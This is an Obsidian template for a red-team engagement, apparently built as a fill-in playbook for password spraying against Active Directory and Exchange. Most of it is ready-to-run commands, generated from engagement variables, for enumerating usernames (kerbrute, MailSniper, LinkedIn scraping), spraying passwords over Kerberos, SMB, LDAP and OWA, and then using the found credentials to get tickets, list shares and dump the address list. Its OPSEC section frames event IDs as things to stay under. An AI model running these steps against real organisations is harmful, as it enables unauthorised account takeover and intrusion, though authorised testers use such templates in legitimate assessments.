---
# Attack-specific fields
spray_target:
spray_username_file: users.txt
spray_password: Password1!
spray_delay: 30
spray_lockout_threshold: 5
valid_users_found:
valid_creds_found:
notes:
---

# Password Spraying

> [!abstract] Attack Summary
> **Password spraying** tries one (or a few) common passwords against many accounts to avoid lockouts. This is often the first step in initial access or lateral movement when you have a username list. Targets include OWA, Exchange, Kerberos pre-auth, SMB, and LDAP.

---

## Baseline (from [[00 - Engagement Baseline]])

```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
dv.table(["Field", "Value"], [
  ["Domain",   b?.domain   ?? "—"],
  ["DC IP",    b?.dc_ip    ?? "—"],
  ["LHOST",    b?.lhost    ?? "—"],
  ["OS Env",   b?.os_env   ?? "—"],
]);
```

---

## Attack-Specific Configuration

```dataviewjs
const p = dv.current();
dv.table(["Field", "Value"], [
  ["Spray Target (OWA/IP/FQDN)",   `\`INPUT[text:spray_target]\``],
  ["Username File",                 `\`INPUT[text(defaultValue("${p.spray_username_file ?? 'users.txt'}")):spray_username_file]\``],
  ["Password to Spray",             `\`INPUT[text(defaultValue("${p.spray_password ?? 'Password1!'}")):spray_password]\``],
  ["Delay Between Attempts (min)",  `\`INPUT[text(defaultValue("${p.spray_delay ?? 30}")):spray_delay]\``],
  ["Lockout Threshold (check first)",`\`INPUT[text(defaultValue("${p.spray_lockout_threshold ?? 5}")):spray_lockout_threshold]\``],
]);
```

> [!danger] Always check the lockout policy BEFORE spraying. One mistake and you lock out dozens of accounts.

---

## Step 0 — Check Lockout Policy First

**Windows — PowerView**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const domain = b?.domain ?? "DOMAIN";
dv.paragraph("```powershell\n# Check password policy\nGet-DomainPolicy | Select-Object -ExpandProperty SystemAccess\n\n# Or via net accounts\nnet accounts /domain\n\n# Key fields: LockoutThreshold, LockoutDuration, ObservationWindow\n```");
```

**Linux**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const domain   = b?.domain ?? "DOMAIN";
const dc_ip    = b?.dc_ip  ?? "DC_IP";
const username = b?.username ?? "USER";
const password = b?.password ?? "PASSWORD";
dv.paragraph("```bash\n# Check password policy\nnxc smb " + dc_ip + " -u '" + username + "' -p '" + password + "' --pass-pol\n\n# Or\nimpacket-polenum " + domain + "/" + username + ":'" + password + "'@" + dc_ip + "\n\n# Fine-grained password policies (PSOs) may differ per group\n```");
```

Lockout threshold: `INPUT[text:spray_lockout_threshold]` (stay well below this)

---

## Step 1 — Build Username List

```dataviewjs
dv.paragraph("```bash\n# Method 1: NameMash from employee names\npython3 namemash.py employees.txt > users.txt\n\n# Method 2: LinkedIn scraping with linkedint\npython3 linkedint.py --username YOUR_EMAIL --password YOUR_PASS -c COMPANY_NAME\n\n# Method 3: From email addresses (strip @domain.com)\ncut -d'@' -f1 emails.txt > users.txt\n\n# Method 4: OSINT via hunter.io, theHarvester, etc.\n```");
```

---

## Step 2 — Validate Usernames (Before Spraying)

**Kerberos Pre-Auth Timing (Unauthenticated)**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const domain  = b?.domain ?? "DOMAIN";
const dc_ip   = b?.dc_ip  ?? "DC_IP";
dv.paragraph("```bash\n# Kerbrute — validate via Kerberos pre-auth\nkerbrute userenum --dc " + dc_ip + " --domain " + domain + " users.txt\n\n# Impacket\nimpacket-GetNPUsers " + domain + "/ -usersfile users.txt -dc-ip " + dc_ip + " -no-pass 2>&1 | grep -v 'Client not found'\n```");
```

**OWA Username Enumeration**
```dataviewjs
const p = dv.current();
const target = p?.spray_target || "OWA_URL";
dv.paragraph("```bash\n# MailSniper - timing-based OWA enumeration\nImport-Module MailSniper.ps1\nInvoke-DomainHarvestOWA -ExchHostname " + target + "\nInvoke-UsernameHarvestOWA -ExchHostname " + target + " -UserList users.txt -OutFile valid_users.txt\n```");
```

Valid users found: `INPUT[text:valid_users_found]`

---

## Step 3 — Password Spray

**Windows — Rubeus (Kerberos)**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const p = dv.current();
const domain   = b?.domain ?? "DOMAIN";
const dc_ip    = b?.dc_ip  ?? "DC_IP";
const password = p?.spray_password || "Password1!";
const userFile = p?.spray_username_file || "users.txt";
dv.paragraph("```bash\n# Kerbrute spray\nkerbrute passwordspray --dc " + dc_ip + " --domain " + domain + " " + userFile + " '" + password + "'\n```");
```

**Linux — NetExec (SMB)**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const p = dv.current();
const domain   = b?.domain ?? "DOMAIN";
const dc_ip    = b?.dc_ip  ?? "DC_IP";
const password = p?.spray_password || "Password1!";
const userFile = p?.spray_username_file || "users.txt";
dv.paragraph("```bash\n# SMB spray (checks if login works)\nnxc smb " + dc_ip + " -u " + userFile + " -p '" + password + "' -d " + domain + " --continue-on-success\n\n# LDAP spray\nnxc ldap " + dc_ip + " -u " + userFile + " -p '" + password + "' -d " + domain + " --continue-on-success\n\n# Kerberos spray (stealthier — doesn't touch SMB/LDAP)\nnxc kerberos " + dc_ip + " -u " + userFile + " -p '" + password + "' -d " + domain + "\n```");
```

**OWA / Exchange Spray**
```dataviewjs
const p = dv.current();
const target   = p?.spray_target || "OWA_URL";
const password = p?.spray_password || "Password1!";
const userFile = p?.spray_username_file || "valid_users.txt";
dv.paragraph("```bash\n# MailSniper OWA spray\nInvoke-PasswordSprayOWA -ExchHostname " + target + " -UserList " + userFile + " -Password '" + password + "'\n\n# After success — dump GAL\nGet-GlobalAddressList -ExchHostname " + target + " -UserName 'DOMAIN\\USER' -Password 'FOUND_PASSWORD' -OutFile gal.txt\n```");
```

Valid creds found: `INPUT[text:valid_creds_found]`

---

## Step 4 — Validate and Leverage

```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const p = dv.current();
const domain = b?.domain ?? "DOMAIN";
const dc_ip  = b?.dc_ip  ?? "DC_IP";
const creds  = p?.valid_creds_found || "USER:PASSWORD";
dv.paragraph("```bash\n# Validate via Kerberos\nkerbrute passwordspray --dc " + dc_ip + " --domain " + domain + " users_validated.txt PASSWORD\n\n# Get TGT for valid account\nimpacket-getTGT " + domain + "/VALID_USER:'FOUND_PASSWORD' -dc-ip " + dc_ip + "\n\n# Or use immediately\nnxc smb " + dc_ip + " -u 'VALID_USER' -p 'FOUND_PASSWORD' -d " + domain + " --shares\n```");
```

---

## OPSEC

> [!warning] Detection Indicators
> - Multiple failed logons across many accounts: **Event 4771** (Kerberos pre-auth failure) or **Event 4625** (logon failure).
> - OWA/EWS/EAS logon failures in IIS logs.
> - Pattern: many different usernames with same password within short timeframe.
> - **Always spray at rate below lockout** — e.g., 1 attempt per account per 30+ minutes.
> - Kerberos pre-auth spray generates less AD noise than SMB/LDAP auth failures.
> - Smart lockout policies in AAD/Entra ID can detect even slow sprays.

---

## Notes & Results

`INPUT[textarea:notes]`
